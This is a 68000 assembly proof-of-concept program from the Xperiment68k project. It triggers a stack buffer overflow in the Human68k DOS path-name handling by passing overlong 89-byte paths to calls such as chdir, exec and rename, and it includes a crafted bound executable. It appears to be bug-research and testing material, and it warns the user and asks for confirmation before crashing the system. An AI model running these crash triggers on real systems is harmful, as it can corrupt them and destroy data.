.title ns_sbo - namests stack buffer overflow PoC

;This file is part of Xperiment68k
;Copyright (C) 2023 TcbnErik
;
;This program is free software: you can redistribute it and/or modify
;it under the terms of the GNU General Public License as published by
;the Free Software Foundation, either version 3 of the License, or
;(at your option) any later version.
;
;This program is distributed in the hope that it will be useful,
;but WITHOUT ANY WARRANTY; without even the implied warranty of
;MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
;GNU General Public License for more details.
;
;You should have received a copy of the GNU General Public License
;along with this program.  If not, see <https://www.gnu.org/licenses/>.

.include macro.mac
.include dosdef.mac
.include console.mac
.include doscall.mac
.include filesys.mac

.include xputil.mac


COMMAND_LIST: .macro tableTop
  COMMAND: .macro label,str
    .sizem sz,cnt
    .if cnt==0
      .dc.b str,0
    .else
      .dc label-tableTop
    .endif
  .endm

  COMMAND DosAssign,'assign'
  COMMAND DosChdir,'chdir'
  COMMAND DosChmod,'chmod'
  COMMAND DosCreate,'create'
  COMMAND DosDelete,'delete'
  COMMAND DosExec0,'exec.0'
  COMMAND DosExec3,'exec.3'
  COMMAND DosExec5,'exec.5'
  COMMAND DosFatchk,'fatchk'
  COMMAND DosFiles,'files'
  COMMAND DosMaketmp,'maketmp'
  COMMAND DosMkdir,'mkdir'
  COMMAND DosNewfile,'newfile'
  COMMAND DosRename,'rename'
  COMMAND DosRmdir,'rmdir'

  .if cnt==0
    .dc.b 0
  .endif

  COMMAND: .macro
    .fail 1
  .endm
.endm


.cpu 68000
.text

ProgramStart:
  lea (1,a2),a0
  bsr AnalyzeArgument
  move.l d0,d7
  bpl @f
    bsr PrintUsage
    bra 9f
  @@:

  bsr AskExecute
  beq 9f
    bsr PrepareBoundFile
    bmi 9f
      bsr ChdirToWorkingDirectory
      move.l d7,d0
      bsr CallCommand
9:
  DOS _EXIT


PrintUsage:
  DOS_PRINT (UsageMessage,pc)
  lea (CommandNames,pc),a0
  @@:
    DOS_PRINT (Indent,pc)
    DOS_PRINT (a0)
    DOS_PRINT (CrLf,pc)
    STREND a0,+1
  tst.b (a0)
  bne @b
  rts


PrepareBoundFile:
  move #-1,-(sp)
  pea (BoundFilename,pc)
  DOS _CHMOD
  addq.l #6,sp
  tst.l d0
  bmi @f
    andi #$0020,d0
    bne 8f
  @@:
  lea (BoundFilename,pc),a0
  bsr MakeDirectories
  bmi 9f

  lea (BoundFilename,pc),a0
  bsr MakeBoundFile
  bmi 9f
8:
  moveq #0,d0
9:
  rts


MakeDirectories:
  pea (a0)
  @@:
    moveq #'\',d0
    move.b d0,(a0)+  ;消した'\'を戻す(ループ初回は'\'を上書きしている)

    bsr strchr
    move.l a0,d0
    beq 9f  ;最深部のディレクトリまで作成できた d0.l=0

    clr.b (a0)  ;見つかった'\'の直前のディレクトリを作成する
    DOS _MKDIR
    tst.l d0
    bpl @b
      move.l d0,-(sp)
      DOS_PRINT (MkdirError,pc)
      move.l (sp)+,d0
9:
  addq.l #4,sp
  rts

strchr:
  @@:
    move.b (a0)+,d1
    beq @f
    cmp.b d0,d1
    bne @b
      subq.l #1,a0
      rts
  @@:
  suba.l a0,a0
  rts


MakeBoundFile:
  move #$0020,-(sp)
  pea (a0)
  DOS _CREATE
  addq.l #6,sp
  move.l d0,d1
  bmi 1f

  pea (BoundFileDataEnd-BoundFileData).w
  pea (BoundFileData,pc)
  move d1,-(sp)
  DOS _WRITE
  addq.l #10-4,sp
  cmp.l (sp)+,d0
  beq @f
    tst.l d0
    bmi 1f
      moveq #-23,d0
    1:
    move.l d0,-(sp)
    DOS_PRINT (CreateBoundFileError,pc)
    move.l (sp)+,d0
    bra 9f
  @@:

  moveq #0,d0
9:
  move.l d0,-(sp)
  tst.l d1
  bmi @f
    move d1,-(sp)
    DOS _CLOSE
    addq.l #2,sp
  @@:
  move.l (sp)+,d0
  rts


ChdirToWorkingDirectory:
  lea (BoundFilename,pc),a0
  pea (a0)
  @@:
    lea (a0),a1
    addq.l #1,a0
    moveq #'\',d0
    bsr strchr
  move.l a0,d0
  bne @b

  clr.b (a1)
  DOS _CHDIR
  addq.l #4,sp
  move.b #'\',(a1)
  rts


CallCommand:
  add d0,d0
  move (CommandList,pc,d0.w),d0
  jmp (CommandList,pc,d0.w)

CommandList:
  COMMAND_LIST CommandList


DosAssign:
  move #ASSIGNMODE_VIRTUAL_DRIVE,-(sp)
  pea (LongDirectory,pc)
  pea (VirtualDriveName,pc)
  move #ASSIGNMD_MAKE,-(sp)
  DOS _ASSIGN
  lea (12,sp),sp
  moveq #-14,d1
  cmp.l d0,d1
  bne @f
    ;仮想ドライブに割り当てできない場合はスタック破壊前にエラー終了する
    DOS_PRINT (AssignErrorMessage,pc)
  @@:
  rts

DosChdir:
  pea (LongDirectory,pc)
  DOS _CHDIR
  addq.l #4,sp
  rts

DosChmod:
  move #-1,-(sp)
  pea (LongDirectory,pc)
  DOS _CHDIR
  addq.l #6,sp
  rts

DosCreate:
  move #1<<FILEATR_ARCHIVE,-(sp)
  pea (LongDirectory,pc)
  DOS _CREATE
  addq.l #6,sp
  rts

DosDelete:
  pea (LongDirectory,pc)
  DOS _DELETE
  addq.l #4,sp
  rts

DosFatchk:
  move #10,-(sp)
  pea (Buffer,pc)
  pea (LongDirectory,pc)
  tas (sp)
  DOS _FATCHK
  lea (10,sp),sp
  rts

DosFiles:
  move #$ff,-(sp)
  pea (LongDirectory,pc)
  pea (Buffer,pc)
  DOS _FILES
  lea (10,sp),sp
  rts

;md=0
;  md=1(load)はmd=0とほぼ同じだが、ロード後の後処理が必要なので省略。
DosExec0:
  clr.l -(sp)
  pea (CommandLine,pc)
  pea (LongDirectory,pc)       ;有効な拡張子の実行ファイル名を指定するなら次の行は不要
  move.b #EXECFILETYPE_X,(sp)  ;(ファイルオープン処理まで到達させるために指定している)
  move #EXECMODE_LOADEXEC,-(sp)
  DOS _EXEC
  lea (14,sp),sp
  rts

;md=3
DosExec3:
  lea (Buffer,pc),a0
  pea (16,a0)  ;limit address
  pea (a0)     ;load address
  pea (LongDirectory,pc)       ;有効な拡張子の実行ファイル名を指定するなら次の行は不要
  move.b #EXECFILETYPE_X,(sp)  ;(ファイルオープン処理まで到達させるために指定している)
  move #EXECMODE_LOADONLY,-(sp)
  DOS _EXEC
  lea (14,sp),sp
  rts

;md=5
DosExec5:
  pea (BoundFilename,pc)  ;検索ファイル名の展開処理ではスタックを破壊しないので、なんでもよい
  pea (LongDirectory,pc)
  move #EXECMODE_BINDNO,-(sp)
  DOS _EXEC
  lea (10,sp),sp
  rts

DosMaketmp:
  move #1<<FILEATR_ARCHIVE,-(sp)
  pea (LongFilename,pc)
  DOS _NEWFILE
  addq.l #6,sp
  rts

DosMkdir:
  pea (LongDirectory,pc)
  DOS _MKDIR
  addq.l #4,sp
  rts

DosNewfile:
  move #1<<FILEATR_ARCHIVE,-(sp)
  pea (LongFilename,pc)
  DOS _NEWFILE
  addq.l #6,sp
  rts

DosRename:
  pea (LongDirectory,pc)
  pea (BoundFilename,pc)  ;旧ファイル名が先にチェックされ、かつスタックを破壊しないので
                          ;正しいファイル名を指定する必要がある(存在しなくてもよい)
  DOS _RENAME
  addq.l #8,sp
  rts

DosRmdir:
  pea (LongDirectory,pc)
  DOS _RMDIR
  addq.l #4,sp
  rts


AnalyzeArgument:
  PUSH d2/a2-a3
  SKIP_SPACE a0
  lea (a0),a2
  lea (CommandNames,pc),a3
  moveq #0,d2
  @@:
    lea (a3),a0
    lea (a2),a1
    bsr strcmpsp
    beq @f
      STREND a3,+1
      addq.l #1,d2
      tst.b (a3)
      bne @b
        moveq #-1,d2
  @@:
  move.l d2,d0
  POP d2/a2-a3
  rts

@@:
  cmp.b (a1)+,d0
  bne 9f
strcmpsp:
  move.b (a0)+,d0
  bne @b
  move.b (a1)+,d0
  beq 9f
    cmpi.b #' ',d0
  9:
  rts


AskExecute:
  DOS_PRINT (PromptMessage,pc)
  clr.l -(sp)  ;0=no 1=yes

  lea (Buffer,pc),a0
  move #8<<8+0,(a0)
  pea (a0)
  move #.low._GETS,-(sp)
  DOS _KFLUSH
  addq.l #6,sp
  subq.l #3,d0
  bne @f
    cmpi.l #'yes'<<8+0,(2,a0)
    bne @f
      addq.l #1,(sp)
  @@:
  DOS_PRINT (CrLf,pc)

  move.l (sp)+,d0
  rts


.data

;バインドされたX形式実行ファイルの内容
;  DOS _EXEC{5}でスタック破壊を起こすコードまで到達できればよいので
;  中身は DOS _EXIT だけのファイル一つのみ。
.even
BoundFileData:
  .dc $4855,$0000,$0000,$0000,$0000,$0000,$0000,$0002
  .dc $0000,$0000,$0000,$0000,$0000,$0000,$0000,$0000
  .dc $0000,$0000,$0000,$0000,$0000,$0000,$0000,$0000
  .dc $0000,$0000,$0000,$0000,$0000,$0000,$0000,$0042
  .dc $ff00,$6130,$2020,$2020,$2020,$7820,$2020,$0000
  .dc $0000,$0000,$0000,$0000,$0000,$8157,$0000,$0000
  .dc $0000
BoundFileDataEnd:

CommandNames:
  COMMAND_LIST

UsageMessage:
  .dc.b 'usage: ns_sbo <command>',CR,LF
  .dc.b CR,LF
  .dc.b 'command = ',CR,LF
  .dc.b 0

Indent: .dc.b '  ',0

PromptMessage:
  .dc.b 'スタック破壊の実験を行います。',CR,LF
  .dc.b CR,LF
  .dc.b 'プログラムを正常に終了できないためリセットする必要があります。',CR,LF
  .dc.b 'コピーバックのディスクキャッシュなどはあらかじめ解除してください。',CR,LF
  .dc.b '実験用に用意したシステムでのみ実行してください。',CR,LF
  .dc.b '※普段使っているシステムでは実行しないこと！',CR,LF
  .dc.b CR,LF
  .dc.b '実行してよろしいですか？(yes/no):',0

CrLf: .dc.b CR,LF,0

MkdirError: .dc.b 'テスト用ディレクトリの作成に失敗しました。',CR,LF,0
CreateBoundFileError: .dc.b 'テスト用ファイルの作成に失敗しました。',CR,LF,0

AssignErrorMessage: .dc.b 'Z:ドライブには仮想ドライブの割り当てができません。',0
VirtualDriveName: .dc.b 'Z:',0

CommandLine: .dc.b 0,0

BoundFilename:
  .dc.b '\aaaaaaaaa'
  .dc.b '\bbbbbbbbb'
  .dc.b '\ccccccccc'
  .dc.b '\ddddddddd'
  .dc.b '\eeeeeeeee'
  .dc.b '\fffffffff'
  .dc.b '\a.x',0

;89バイトのパス名
LongDirectory:
  .dc.b 'AAAAAAAAA\'
  .dc.b 'CCCCCCCCC\'
  .dc.b 'EEEEEEEEE\'
  .dc.b 'GGGGGGGGG\'
  .dc.b 'IIIIIIIII\'
  .dc.b 'KKKKKKKKK\'
  .dc.b 'MMMMMMMMM\'
  .dc.b 'OOOOOOOOO\'
  .dc.b 'QQQQQQQQ\',0

;89バイトのファイル名
LongFilename:
  .dc.b 'AAAAAAAAA\'
  .dc.b 'CCCCCCCCC\'
  .dc.b 'EEEEEEEEE\'
  .dc.b 'GGGGGGGGG\'
  .dc.b 'IIIIIIIII\'
  .dc.b 'KKKKKKKKK\'
  .dc.b 'MMMMMMMMM\'
  .dc.b 'OOOOOOOOO\'
  .dc.b 'QQQQQQQ\_',0


.bss
.quad

Buffer: .ds.b 256



.end ProgramStart
